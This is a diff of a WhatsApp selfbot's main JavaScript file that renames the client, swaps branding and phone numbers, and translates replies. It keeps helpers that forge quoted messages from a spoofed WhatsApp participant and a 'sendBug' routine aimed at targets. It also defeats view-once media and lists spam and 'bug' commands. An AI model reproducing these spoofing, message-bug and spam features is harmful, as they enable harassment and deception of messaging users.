         thumbnail: fs.readFileSync("./stik/fake.jpeg"),
         quoted: mek,
         caption: yes,
       });
     };
     const fakegroup = (teks) => {
-      itsmevall.sendMessage(from, teks, text, {
+      client.sendMessage(from, teks, text, {
         quoted: {
           key: {
             fromMe: false,
             participant: `0@s.whatsapp.net`,
-            ...(from ? { remoteJid: "996755994412@g.us" } : {}),
+            ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {}),
           },
           message: {
             imageMessage: {
@@ -632,40 +542,21 @@ const ftex = {
             .on("close", callback);
         });
       };
-itsmevall.on('CB:action,,battery', json => {
-		global.batteryLevelStr = json[2][0][1].value
-	   global.batterylevel = parseInt(batteryLevelStr)
-		baterai = batterylevel
-        if (json[2][0][1].live == 'true') charging = true
-       if (json[2][0][1].live == 'false') charging = false
-        console.log(json[2][0][1])
-		console.log('Baterai : ' + batterylevel+'%')
-	})
-	global.batrei = global.batrei ? global.batrei : []
-		itsmevall.on('CB:action,,battery', json => {
-		const batteryLevelStr = json[2][0][1].value
-		const batterylevel = parseInt(batteryLevelStr)
-		global.batrei.push(batterylevel)
-		}) 
       download(url, "./stik" + names + ".png", async function () {
-        console.log("done");
+        console.log("selesai");
         let filess = "./stik" + names + ".png";
         let asw = "./stik" + names + ".webp";
         exec(
           `ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`,
           (err) => {
             let media = fs.readFileSync(asw);
-            itsmevall.sendMessage(to, media, MessageType.sticker, { quoted: mek });
+            client.sendMessage(to, media, MessageType.sticker, { quoted: mek });
             fs.unlinkSync(filess);
             fs.unlinkSync(asw);
           }
         );
       });
     };
-//******************* 》banchat《 ********************\\
-if (isBanchat){
-if (!itsMe && !isOwner)return 
-}
     const ftokoo = {
       key: {
         fromMe: false,
@@ -677,10 +568,10 @@ if (!itsMe && !isOwner)return
           product: {
             productImage: {
               mimetype: "image/jpeg",
-              jpegThumbnail: fs.readFileSync(`./stik/thumb.jpeg`), //The picture
+              jpegThumbnail: fs.readFileSync(`./stik/thumb.jpeg`), //Gambarnye
             },
-            title: "ALREADY DONE BRO", //Love your name
-            description: "SELF BOT",
+            title: "DreamGuyXeon", //Love your name
+            description: "Xeon-BOT",
             currencyCode: "USD",
             priceAmount1000: "2000",
             retailerId: "Xeon",
@@ -690,29 +581,6 @@ if (!itsMe && !isOwner)return
         },
       },
     };
- const ftok = {
-key: {
-			fromMe: false,
-			participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})
-		},
-		message: {
-			"productMessage": {
-				"product": {
-					"productImage":{
-						"mimetype": "image/jpeg",
-						"jpegThumbnail": iye //The picture
-					},
-					"title": `${ucapanWaktu} ${pushname}`, //Love your name 
-					"description": `${ucapanWaktu} ${pushname}`, 
-					"currencyCode": "USD",
-					"priceAmount1000": "2000",
-					"retailerId": `${ucapanWaktu} ${pushname}`,
-					"productImageCount": 1
-				},
-				    "businessOwnerJid": `0@s.whatsapp.net`
-		}
-	}
-}
     const sendMediaURL = async (to, url, text = "", mids = []) => {
       if (mids.length > 0) {
         text = normalizeMention(to, text, mids);
@@ -739,7 +607,7 @@ key: {
         if (mime.split("/")[0] === "audio") {
           mime = Mimetype.mp4Audio;
         }
-        itsmevall.sendMessage(to, media, type, {
+        client.sendMessage(to, media, type, {
           quoted: mek,
           mimetype: mime,
           caption: text,
@@ -749,125 +617,87 @@ key: {
         fs.unlinkSync(filename);
       });
     };
-///Button Text
-const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
-const buttonMessage = {
-contentText: text1,
-footerText: desc1,
-buttons: but,
-headerType: 1
-}
-itsmevall.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
-}
-///Button Image
-const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
-kma = gam1
-mhan = await itsmevall.prepareMessage(from, kma, image)
-const buttonMessages = {
-imageMessage: mhan.message.imageMessage,
-contentText: text1,
-footerText: desc1,
-buttons: but,
-headerType: 4
-}
-itsmevall.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
-}
-///Button Video
-const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
-kma = vid1
-mhan = await itsmevall.prepareMessage(from, kma, video)
-const buttonMessages = {
-videoMessage: mhan.message.videoMessage,
-contentText: text1,
-footerText: desc1,
-buttons: but,
-headerType: 5
-}
-itsmevall.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
-}
-///Button Location
-const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
-kma = gam1
-mhan = await itsmevall.prepareMessage(from, kma, location)
-const buttonMessages = {
-locationMessage: mhan.message.locationMessage,
-contentText: text1,
-footerText: desc1,
-buttons: but,
-headerType: 6
-}
-itsmevall.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
-}
+    const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
+      const buttonMessage = {
+        contentText: text1,
+        footerText: desc1,
+        buttons: but,
+        headerType: 1,
+      };
+      client.sendMessage(
+        id,
+        buttonMessage,
+        MessageType.buttonsMessage,
+        options
+      );
+    };
+    const sendButImage = async (
+      id,
+      text1,
+      desc1,
+      gam1,
+      but = [],
+      options = {}
+    ) => {
+      kma = gam1;
+      mhan = await client.prepareMessage(from, kma, image);
+      const buttonMessages = {
+        imageMessage: mhan.message.imageMessage,
+        contentText: text1,
+        footerText: desc1,
+        buttons: but,
+        headerType: 4,
+      };
+      client.sendMessage(
+        id,
+        buttonMessages,
+        MessageType.buttonsMessage,
+        options
+      );
+    };
+    const sendButVideo = async (
+      id,
+      text1,
+      desc1,
+      vid1,
+      but = [],
+      options = {}
+    ) => {
+      kma = vid1;
+      mhan = await client.prepareMessage(from, kma, video);
+      const buttonMessages = {
+        videoMessage: mhan.message.videoMessage,
+        contentText: text1,
+        footerText: desc1,
+        buttons: but,
+        headerType: 5,
+      };
+      client.sendMessage(
+        id,
+        buttonMessages,
+        MessageType.buttonsMessage,
+        options
+      );
+    };
     const kick = function (from, orangnya) {
       for (let i of orangnya) {
-        itsmevall.groupRemove(from, [i]);
+        client.groupRemove(from, [i]);
       }
     };
     const add = function (from, orangnya) {
-      itsmevall.groupAdd(from, orangnya);
+      client.groupAdd(from, orangnya);
     };
-        const grupinv = (teks) => {
-        	grup = itsmevall.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '996755994412@g.us', "inviteCode": 'https://chat.whatsapp.com/FpE1TXXUzuk0TASzYwX8ZM', "groupName": `Xeon-Bot Inc.`, "footerText": "*_© Xeon_*", "jpegThumbnail": iye, "caption": teks}}, {quoted:mek})
-            itsmevall.relayWAMessage(grup)
-        }
-const fakeitem = (teks) => {
-            itsmevall.sendMessage(from, teks, text, {
-                quoted: {
-        key:{
-        	fromMe:false,
-        participant:`0@s.whatsapp.net`, ...(from ? {
-remoteJid :"996755994412@g.us" }: {})
-                    },message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync(`./stik/thumb.jpeg`),"itemCount":10,"status":"INQUIRY","surface":"CATALOG","message":`Xeon`,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true})}
-const katalog = (teks) => {
-             res = itsmevall.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 321, "message": teks, "footerText": "*Xeon*", "thumbnail": iye, "surface": 'CATALOG' }}, {quoted:mek})
-             itsmevall.relayWAMessage(res)
-        }
-function _0x2677(_0x32d997,_0xb85446){const _0x2b93a2=_0x2b93();return _0x2677=function(_0x2677fc,_0x256d87){_0x2677fc=_0x2677fc-0xab;let _0x5d80f9=_0x2b93a2[_0x2677fc];return _0x5d80f9;},_0x2677(_0x32d997,_0xb85446);}(function(_0x49cf49,_0x43fa39){const _0x6b1e4=_0x2677,_0x52c735=_0x49cf49();while(!![]){try{const _0x129adc=-parseInt(_0x6b1e4(0xab))/0x1+-parseInt(_0x6b1e4(0xaf))/0x2*(parseInt(_0x6b1e4(0xb1))/0x3)+-parseInt(_0x6b1e4(0xb0))/0x4+-parseInt(_0x6b1e4(0xad))/0x5+parseInt(_0x6b1e4(0xb5))/0x6+-parseInt(_0x6b1e4(0xb4))/0x7*(-parseInt(_0x6b1e4(0xb2))/0x8)+parseInt(_0x6b1e4(0xac))/0x9;if(_0x129adc===_0x43fa39)break;else _0x52c735['push'](_0x52c735['shift']());}catch(_0x32d4eb){_0x52c735['push'](_0x52c735['shift']());}}}(_0x2b93,0x7fba4));const fakewa=_0x473dba=>{const _0x3b878d=_0x2677;itsmevall[_0x3b878d(0xae)](from,_0x473dba,text,{'thumbnail':fake,'sendEphemeral':!![],'quoted':mek,'contextInfo':{'forwardingScore':0x1fc,'isForwarded':!![],'externalAdReply':{'title':jam+_0x3b878d(0xb3)+week+'\x20'+weton+_0x3b878d(0xb3)+date,'body':'','previewType':'PHOTO','thumbnail':iye,'sourceUrl':_0x3b878d(0xb6)}}});};function _0x2b93(){const _0x1f304a=['2010292UACuqn','837801nVErtU','112088VAjxTz','\x20-\x20','399NATgTv','5080656EWtmpw','https://wa.me/996755994412?text=Hello bhai','900103dzIdVr','6245991KHbGEy','671435MqIrux','sendMessage','2cSiZEQ'];_0x2b93=function(){return _0x1f304a;};return _0x2b93();}
-/*const katlog = (teks) => {
-             res = itsmevall.prepareMessageFromContent(from,{ "productMessage": { "product", priceAmount1000: "2000","message": teks, mimetype: "image/jpeg", "footerText": "ItsmeVall", "thumbnail": iye, "surface": 'CATALOG' }}, {quoted:mek})
-             itsmevall.relayWAMessage(res)
-        }*/
-const replyfakelink = (teks) => {
-itsmevall.sendMessage(from, teks, text,{contextInfo :{text: 'hi',
-"forwardingScore": 1000000000,
-isForwarded: false,
-sendEphemeral: false,
-"externalAdReply": {
-                "title": `Vimdhayak Bot\nX e o n. (@josephxeon) •Instagram photos and Videos`,
-                "body": "",
-                "previewType": "PHOTO",
-                "thumbnailUrl": "https://k.top4top.io/p_20775ulbr0.jpg",
-                "thumbnail": fake,
-                "sourceUrl": ``
-},mentionedJid:[sender]}, quoted : fgif})
-};
-const replywa = (teks) => {
-itsmevall.sendMessage(from, teks, text,{contextInfo :{text: 'hi',
-"forwardingScore": 1000000000,
-isForwarded: false,
-sendEphemeral: false,
-"externalAdReply": {
-                "title": `Whatsapp`,
-                "body": `wa.me/996755994412`,
-                "mediaType": "10",
-                "mediaUrl": `wa.me/996755994412`,
-                "thumbnailUrl": "https://k.top4top.io/p_20779elwn0.jpg",
-                "thumbnail": iye,
-                "sourceUrl": `wa.me/996755994412`,
-},mentionedJid:[sender]}, quoted : mek})
-};
-function _0x23f0(){const _0xb751aa=['https://i.ibb.co/0B7SV7C/FB-IMG-1633258042205.jpg','5378196SaDwil','537918aztXIm','readFileSync','9EjBtBZ','104470aAeKBR','https://youtube.com/channel/UCvAo9TZ0Pw9vrJ_0WYRyO3A','5cDZJJo','20379lPcRuW','./stik/thumb.jpeg','sendMessage','44PReDXE','Hello\x20','8pgbmZm','240929GbKExl','11TGLAJt','1420349MLJTFP','2512074oFCnxW'];_0x23f0=function(){return _0xb751aa;};return _0x23f0();}(function(_0x1e55a3,_0x56e726){const _0xdc492=_0x3b80,_0x3f050a=_0x1e55a3();while(!![]){try{const _0x615a03=-parseInt(_0xdc492(0x1ea))/0x1+-parseInt(_0xdc492(0x1f0))/0x2+parseInt(_0xdc492(0x1e4))/0x3*(parseInt(_0xdc492(0x1e7))/0x4)+-parseInt(_0xdc492(0x1f5))/0x5*(-parseInt(_0xdc492(0x1ed))/0x6)+-parseInt(_0xdc492(0x1ec))/0x7*(parseInt(_0xdc492(0x1e9))/0x8)+-parseInt(_0xdc492(0x1f2))/0x9*(parseInt(_0xdc492(0x1f3))/0xa)+-parseInt(_0xdc492(0x1eb))/0xb*(-parseInt(_0xdc492(0x1ef))/0xc);if(_0x615a03===_0x56e726)break;else _0x3f050a['push'](_0x3f050a['shift']());}catch(_0x2290c1){_0x3f050a['push'](_0x3f050a['shift']());}}}(_0x23f0,0x354e7));function _0x3b80(_0x185291,_0x399c5e){const _0x23f087=_0x23f0();return _0x3b80=function(_0x3b80a1,_0x38fc9b){_0x3b80a1=_0x3b80a1-0x1e4;let _0x322fe2=_0x23f087[_0x3b80a1];return _0x322fe2;},_0x3b80(_0x185291,_0x399c5e);}const fakeyt=_0x5773fb=>{const _0x5831e4=_0x3b80;itsmevall[_0x5831e4(0x1e6)](from,_0x5773fb,text,{'contextInfo':{'text':'hi','forwardingScore':0x3b9aca00,'isForwarded':![],'sendEphemeral':![],'externalAdReply':{'title':_0x5831e4(0x1e8)+pushname,'body':''+ucapanWaktu,'mediaType':'2','thumbnailUrl':_0x5831e4(0x1ee),'mediaUrl':_0x5831e4(0x1f4),'thumbnail':fs[_0x5831e4(0x1f1)](_0x5831e4(0x1e5)),'sourceUrl':''},'mentionedJid':[sender]},'quoted':fgif});};
     const sendBug = async (target, teks) => {
       if (!teks) teks = ".";
-      await itsmevall.relayWAMessage(
-        itsmevall.prepareMessageFromContent(
+      await client.relayWAMessage(
+        client.prepareMessageFromContent(
           target,
-          itsmevall.prepareDisappearingMessageSettingContent(0),
+          client.prepareDisappearingMessageSettingContent(0),
           {}
         ),
         { waitForAck: true }
       );
-      itsmevall.sendMessage(target, teks, "conversation");
+      client.sendMessage(target, teks, "conversation");
     };
 
     //FUNCTION
@@ -884,9 +714,9 @@ function _0x23f0(){const _0xb751aa=['https://i.ibb.co/0B7SV7C/FB-IMG-16332580422
         if (isAfk(mek.key.remoteJid)) return;
         addafk(mek.key.remoteJid);
         heheh = ms(Date.now() - waktu);
-        itsmevall.sendMessage(
+        client.sendMessage(
           mek.key.remoteJid,
-          `@${owner} Currently Offline!\n\n*Reason :* ${alasan}\n*Since :* ${heheh.hours} Hour, ${heheh.minutes} Minute, ${heheh.seconds} Seconds ago\n\nPlease contact again later`,
+          `@${owner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`,
           MessageType.text,
           {
             contextInfo: {
@@ -919,9 +749,9 @@ function _0x23f0(){const _0xb751aa=['https://i.ibb.co/0B7SV7C/FB-IMG-16332580422
                   if (isAfk(mek.key.remoteJid)) return;
                   addafk(mek.key.remoteJid);
                   heheh = ms(Date.now() - waktu);
-                  itsmevall.sendMessage(
+                  client.sendMessage(
                     mek.key.remoteJid,
-                    `@${owner} Currently Offline!\n\n *Reason :* ${alasan}\n *Since :* ${heheh.hours} Hour, ${heheh.minutes} Minute, ${heheh.seconds} Seconds ago\n\nPlease Call Again Later`,
+                    `@${owner} Abhi Offline Hai!\n\n *Karan :* ${alasan}\n *Jabse :* ${heheh.hours} Ghanta, ${heheh.minutes} Minat, ${heheh.seconds} Seconds pahele\n\nKrpaya baad mein phir se sampark karen`,
                     MessageType.text,
                     {
                       contextInfo: {
@@ -957,27 +787,6 @@ function _0x23f0(){const _0xb751aa=['https://i.ibb.co/0B7SV7C/FB-IMG-16332580422
       type === "extendedTextMessage" && content.includes("audioMessage");
     const isQuotedSticker =
       type === "extendedTextMessage" && content.includes("stickerMessage");
-/*if (listbut) console.log("[",color("command","lime"),"]",time2,color(listbut,"lime"),"from",color(sender.split("@")[0],"cyan"))*/
-//list command
-
-async function sendFileFromUrl(from, url, caption, msg, men) {
-            let mime = '';
-            let res = await axios.head(url)
-            mime = res.headers['content-type']
-            let type = mime.split("/")[0]+"Message"
-            if(mime === "image/gif"){
-                type = MessageType.video
-                mime = Mimetype.gif
-            }
-            if(mime === "application/pdf"){
-                type = MessageType.document
-                mime = Mimetype.pdf
-            }
-            if(mime.split("/")[0] === "audio"){
-                mime = Mimetype.mp4Audio
-            }
-            return itsmevall.sendMessage(from, await getBuffer(url), type, {caption: caption, quoted: mek, mimetype: mime, contextInfo: {"mentionedJid": men ? men : []}})
-        }
     if (!isGroup && prefix && command)
       console.log(
         "\x1b[1;31m~\x1b[1;37m>",
@@ -1009,10 +818,10 @@ async function sendFileFromUrl(from, url, caption, msg, men) {
         let vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`));
         let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`));
         let fil = vote.map((v) => v.participant);
-        let id_vote = sender ? sender : "996755994412@s.whatsapp.net";
+        let id_vote = sender ? sender : "6283152753417@s.whatsapp.net";
         if (fil.includes(id_vote)) {
           return mentions(
-            "@" + sender.split("@")[0] + " You have voted",
+            "@" + sender.split("@")[0] + " apne vote kiya",
             fil,
             true
           );
@@ -1027,7 +836,7 @@ async function sendFileFromUrl(from, url, caption, msg, men) {
             "*Vote* " +
             "@" +
             _votes[0].votes.split("@")[0] +
-            `\n\n*Reason*: ${_votes[0].reason}\n*Number of Votes* : ${vote.length} Vote\n*Duration* : ${_votes[0].durasi} Minute\n\n`;
+            `\n\n*Karan*: ${_votes[0].reason}\n*Amount of vote* : ${vote.length} Vote\n*Duration* : ${_votes[0].durasi} Minat\n\n`;
           for (let i = 0; i < vote.length; i++) {
             _vote += `@${vote[i].participant.split("@")[0]}\n*Vote* : ${
               vote[i].voting
@@ -1041,10 +850,10 @@ async function sendFileFromUrl(from, url, caption, msg, men) {
         const vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`));
         let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`));
         let fil = vote.map((v) => v.participant);
-        let id_vote = sender ? sender : "996755994412@s.whatsapp.net";
+        let id_vote = sender ? sender : "6283152753417@s.whatsapp.net";
         if (fil.includes(id_vote)) {
           return mentions(
-            "@" + sender.split("@")[0] + " You have voted",
+            "@" + sender.split("@")[0] + " Apne vote kiya",
             fil,
             true
           );
@@ -1059,7 +868,7 @@ async function sendFileFromUrl(from, url, caption, msg, men) {
             "*Vote* " +
             "@" +
             _votes[0].votes.split("@")[0] +
-            `\n\n*Reason*: ${_votes[0].reason}\n*Number of Votes* : ${vote.length} Vote\n*Duration* : ${_votes[0].durasi} Minute\n\n`;
+            `\n\n*Karan*: ${_votes[0].reason}\n*Amount of vote* : ${vote.length} Vote\n*Duration* : ${_votes[0].durasi} Minat\n\n`;
           for (let i = 0; i < vote.length; i++) {
             _vote += `@${vote[i].participant.split("@")[0]}\n*Vote* : ${
               vote[i].voting
@@ -1087,7 +896,7 @@ async function sendFileFromUrl(from, url, caption, msg, men) {
         nomor +
         "\n" +
         "END:VCARD";
-      itsmevall.sendMessage(
+      client.sendMessage(
         from,
         { displayname: nama, vcard: vcard },
         MessageType.contact,
@@ -1097,19 +906,19 @@ async function sendFileFromUrl(from, url, caption, msg, men) {
     //love me if you make
     if (isGroup && isAntilink && !mek.key.fromMe) {
       if (budy.includes("://chat.whatsapp.com/")) {
-        if (isGroupAdmins) return reply("am not admin");
-        reply("ANTILINK DETECTED!! SORRY YOU WILL BE KICKED ;V");
-        itsmevall.groupRemove(from, [sender]);
+        if (isGroupAdmins) return reply("free admin");
+        reply("link ka pata chala, shama karen aapako laat maaree jaegee");
+        client.groupRemove(from, [sender]);
       }
     }
     if (isGroup && isAntiviewonce && m.mtype == "viewOnceMessage") {
       reply(
-        `@${sender.split("@")[0]} Detected image/video viewonce!`
+        `@${sender.split("@")[0]} Detected sending image/video viewonce!`
       );
       var msg = { ...mek };
       msg.mek = mek.message.viewOnceMessage.message;
       msg.mek[Object.keys(msg.mek)[0]].viewOnce = false;
-      itsmevall.copyNForward(m.chat, msg);
+      client.copyNForward(m.chat, msg);
     }
     if (
       isGroup &&
@@ -1119,17 +928,17 @@ async function sendFileFromUrl(from, url, caption, msg, men) {
     ) {
       console.log(
         color("[ANTI-HIDETAG]", "red"),
-        color(`@${sender.split("@")[0]} mengirim pesan hidetag`, "white")
+        color(`@${sender.split("@")[0]} send message hidetag`, "white")
       );
-      reply(`@${sender.split("@")[0]} Detected hidetag messages!!`);
+      reply(`@${sender.split("@")[0]} Detected sending hidetag messages!!`);
       kick(from, sender);
     }
 
     if (isGroup && isAntivirtex && !mek.key.fromMe) {
       if (budy.length > 700) {
-        if (isGroupAdmins) return reply("bot not admin");
-        reply("ANTIVIRTEX DETECTED!! SORRY YOU WILL BE KICKED ;V");
-        itsmevall.groupRemove(from, sender);
+        if (isGroupAdmins) return reply("free admin");
+        reply("virus ka pata chala, shama karen aapko laat maaree jaegee");
+        client.groupRemove(from, sender);
       }
     }
     if (isGroup && autojoin == true) {
@@ -1138,7 +947,7 @@ async function sendFileFromUrl(from, url, caption, msg, men) {
           color("[AUTO-JOIN]", "red"),
           color("YAHAHAHHAHAH", "white")
         );
-        itsmevall.query({
+        client.query({
           json: [
             "action",
             "invite",
@@ -1148,347 +957,202 @@ async function sendFileFromUrl(from, url, caption, msg, men) {
       }
     }
     if (isGroup && isKickarea && !mek.key.fromMe) {
-      if (sender.includes("91")) {
-        reply("GRUP ONLY +91!");
-        itsmevall.groupRemove(from, [sender]);
+      if (sender.includes("1")) {
+        reply("+1 IS NOT ALLOWED IN THE GROUP!");
+        client.groupRemove(from, [sender]);
       }
     }
-    let settingstatus = 0;
-    if (new Date() * 1 - settingstatus > 1000) {
-      let _uptime = process.uptime() * 1000;
-      let uptime = clockString(_uptime);
 
-await itsmevall.setStatus(`Active since ${uptime}`).catch((_) => _);
-      settingstatus = new Date() * 1;
-    }
     if (!mek.key.fromMe && banChats === true) return;
-switch (command) {
-case 'help':
-case 'menu':
-       txtt =`Hi bro ${pushname}\nChoose an Option Below Yeah.. `
 
-               buttons = [{buttonId:`${prefix}command`, 
-               buttonText:{displayText: 'MENU📒'},type:1},
-               {buttonId:`${prefix}status`,buttonText:{displayText:'BOT STATUS🛠️'},type:1}]
+    switch (command) {
+      case "menu":
+      case "help":
+      case "?":
+        var menu = `Kaise ho mere dost🙂 @${senderr.split("@")[0]}
 
-               imageMsg = (await itsmevall.prepareMessageMedia(fs.readFileSync(`./stik/oksip.jpeg`), 'imageMessage', {thumbnail: fs.readFileSync(`./stik/oksip.jpeg`)})).imageMessage
+⦿ IG: @josephxeon13
+⦿ Learn to make bot.
+    watch it on youtube: https://youtube.com/channel/UCvAo9TZ0Pw9vrJ_0WYRyO3A
+${readmore}
 
-               buttonsMessage = {
-               contentText: `${txtt}`,
-               footerText: `© Owner: ${fakeyoi}
-YouTube = https://youtube.com/channel/UCvAo9TZ0Pw9vrJ_0WYRyO3A
-Instagram = https://www.instagram.com/josephxeon13/
-Github = https://github.com/DGXeon
- 
-*Gulambi Owner Vimdhayak*`, imageMessage: imageMsg,
-               buttons: buttons,
-               headerType: 4
-}
-prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
-               itsmevall.relayWAMessage(prep)
-              
-               break
-      case 'command':
-        var menu = `                   *HELLO YAAR*✨    `;
-        sendButVideo(from, menu, `${ucapanWaktu} ${pushname}
-╔════════════►
-║⦿ Prefix : ${prefix}
-║${readmore}
-╚══════════════►
-╔════════════►
-║⦿*OWNER MENU*
-║❏off
-║❏isbaileys
-║❏banchat
-║❏unbanchat
-║❏listbc
-║❏antidelete on|off
-║❏autotype on| off
-║❏autoread gc on / gc off
-║❏autovn on / off
-║❏anticall on | off
-║❏getcaption
-║❏on
-║❏status
-║❏setthumb
-║❏settarget
-║❏setfakeimg
-║❏setreply
-║❏bugpc2
-║❏bugpc
-║❏bugcombine
-║❏bugloc
-║❏bug [amount]
-║❏hacked
-║❏setprefix [2 Button]
-║❏mode [2 Button self/public]
-║❏term <code>
-║❏eval <code>
-║❏colongsw [reply sw]
-╚══════════════►    
-╔══════════════►
-║⦿*GRUP MENU*
-║❏grup [3 Button]
-║❏promote <reply chat member>
-║❏demote <reply chat member>
-║❏setdesc
-║❏setname
-║❏kick <reply/tag member>
-║❏add <reply/tag member>
-║❏getbio <reply chat member>
-║❏getname <reply chat member>
-║❏reminder <msg/2s>
-║❏listonline
-║❏sider [reply chat bot]
-║❏antilink
-║❏tod 
-║❏tospam [amount]
-║❏antihidetag
-║❏antiviewonce
-║❏autojoin
-║❏antivirtex
-║❏kickarea
-╚══════════════►    
-╔══════════════►
-║⦿*MAKER MENU*
-║❏sticker
-║❏swm <author|packname>
-║❏take <author|packname>
-║❏fdeface
-║❏attp teks
-║❏fancytext teks
-║❏emoji
-║❏halloween teks
-║❏vampire teks
-║❏codetxt teks
-║❏matrix teks
-║❏googletxt teks
-║❏spiderman teks
-║❏express
-║❏teks teks
-║❏dance
-║❏write teks
-║❏text3d teks
-║❏warrior teks
-╚══════════════►
-╔══════════════►
-║⦿*CONVERT MENU*
-║❏toimg
-║❏tomp3
-║❏tomp4
-║❏slow
-║❏fast
-║❏reverse
-║❏tourl
-╚══════════════►    
-╔══════════════►
-║⦿*DOWNLOADER MENU*
-║❏tiktok <url>
-║❏ytmp4 <url>
-║❏play <url>
-║❏ytmp3 <url>
-║❏instagram <url>
-║❏twitter <url>
-╚══════════════►
-╔══════════════►
-║⦿*UP STORY MENU*
-║❏upswteks
-║❏upswimage
-║❏upswvideo
-╚══════════════►    
-╔══════════════►
-║⦿*FUN MENU*
-║❏slander
-║❏slanderpc
-║❏contact
-║❏intake
-║❏viewonce
-║❏vn sec number
-║❏video sec number
-║❏hbd [ 2005 11 10 ]
-╚══════════════►    
-╔══════════════►
-║⦿*TAG MENU*
-║❏hidetag
-║❏contag
-║❏sticktag
-║❏totag
-╚══════════════►    
-╔══════════════►
-║⦿*OTHER MENU*
-║❏ping
-║❏inspect
-║❏join
-║❏dice
-║❏numbers 
-║❏calculator
-║❏pantun
-║❏ss link web
-║❏lyrics <query>
-║❏namemeaning<name>
-║❏debug
-║❏loli 
-║❏debug2
-║❏earthquakeinfo
-║❏recipes
-║❏chat 91|P
-║❏searchmessage <query>
-║❏get url
-║❏githubstalk <query>
-║❏ytsearch <query>
-║❏igstalk <query>
-║❏tiktokstalk <query>
-║❏play <query>
-║❏video <query>
-║❏igstory <username>
-║❏twitter <link>
-║❏tiktok <link>
-║❏tiktokaudio <link>
-║❏fb <link>
-║❏brainly <query>
-║❏image <query>
-║❏anime <random>
-║❏pinterest <query>
-║❏comic <query>
-║❏lyrics <query>
-║❏char <query>
-║❏playstore <query>
-║❏otaku <query>
-╚══════════════►    
-╔══════════════►
-║⦿*RENT BOT MENU*
-║❏rentbot
-║❏stoprentbot
-║❏listbot
-╚══════════════►
-╔══════════════►
-║⦿*STICKER CMD MENU*
-║❏addcmd
-║❏delcmd
-║❏listcmd
-╚══════════════►
-╔══════════════►    
-║⦿*VOTE MENU*
-║❏voting
-║❏delvote
-║❏ vote
-║❏ devote
-╚══════════════►    
- *々INFO BOT々*
-🔖Prefix : 「 ${prefixStatus ? "Multi Prefix" : "No Prefix"} 」
-🔖Runtime : ${runtime(process.uptime())}
-🔖Hit Today : ${hit_today.length} Hit
-🔖Total Hit : ${totalhit} Hit
-🔖Total Chat : ${totalchat.length} Chat`, thumb, [
-          {
-            buttonId: `${prefix}owner`,
-            buttonText: {
-              displayText: `OWNER/CREATOR🐧`,
-            },
-            type: 1,
-          },
+*OWNER*
+• ${prefix}off
+• ${prefix}on
+• ${prefix}status
+• ${prefix}setthumb
+• ${prefix}settarget
+• ${prefix}setfakeimg
+• ${prefix}setreply
+• ${prefix}setprefix [2 Button]
+• ${prefix}mode [2 Button self/public]
+• ${prefix}term <code>
+• ${prefix}eval <code>
+• ${prefix}colongsw [reply sw]
+    
+*GRUP*
+• ${prefix}grup [3 Button]
+• ${prefix}promote <reply chat member>
+• ${prefix}demote <reply chat member>
+• ${prefix}setdesc
+• ${prefix}setname
+• ${prefix}kick <reply/tag member>
+• ${prefix}add <reply/tag member>
+• ${prefix}getbio <reply chat member>
+• ${prefix}getname <reply chat member>
+• ${prefix}reminder <msg/2s>
+• ${prefix}listonline
+• ${prefix}linkgc
+• ${prefix}sider [reply chat bot]
+• ${prefix}antilink
+• ${prefix}antihidetag
+• ${prefix}antiviewonce
+• ${prefix}antivirus
+• ${prefix}kickarea <anti +1 number>
+• ${prefix}leveling <1(on)/0(off)>
+• ${prefix}delete <reply to bot msg>
+• ${prefix}bc <broadcast both>
+• ${prefix}bcgc <broadcast grup>
+• ${prefix}profile
+    
+*MAKER*
+• ${prefix}wolf <text>
+• ${prefix}tfire <text>
+• ${prefix}ytgold <text>
+• ${prefix}ytsilver <text>
+• ${prefix}t3d  <text>
+• ${prefix}logoa <text&text>
+• ${prefix}phlogo <text&text>
+• ${prefix}write <text>
+• ${prefix}phcomment <text&text>
+• ${prefix}marvel <text&text>
+• ${prefix}leavest<text>
+• ${prefix}neon <text>
+• ${prefix}wall <text>
+• ${prefix}sticker
+• ${prefix}swm <author|packname>
+• ${prefix}take <author|packname>
+• ${prefix}fdeface
+• ${prefix}emoji
+    
+*CONVERT*
+• ${prefix}toimg
+• ${prefix}tomp3
+• ${prefix}tomp4
+• ${prefix}slow
+• ${prefix}fast
+• ${prefix}reverse
+• ${prefix}tourl
+• ${prefix}tts
+• ${prefix}attp
+    
+*DOWNLOADER*
+• ${prefix}youtube <url>
+• ${prefix}tiktok <url>
+• ${prefix}instagram <url>
+• ${prefix}twitter <url>
+
+*UP STORY*
+• ${prefix}upswtxts
+• ${prefix}upswimage
+• ${prefix}upswvideo
+    
+*CONTACT*
+• ${prefix}slander
+• ${prefix}slanderpc
+• ${prefix}contact
+    
+*TAG*
+• ${prefix}tagall
+• ${prefix}hidetag
+• ${prefix}contacttag
+• ${prefix}sticktag
+• ${prefix}mediatag
+
+*FUN*
+• ${prefix}truth
+• ${prefix}dare
+• ${prefix}lesbiancheck
+• ${prefix}handsomecheck
+• ${prefix}gaycheck
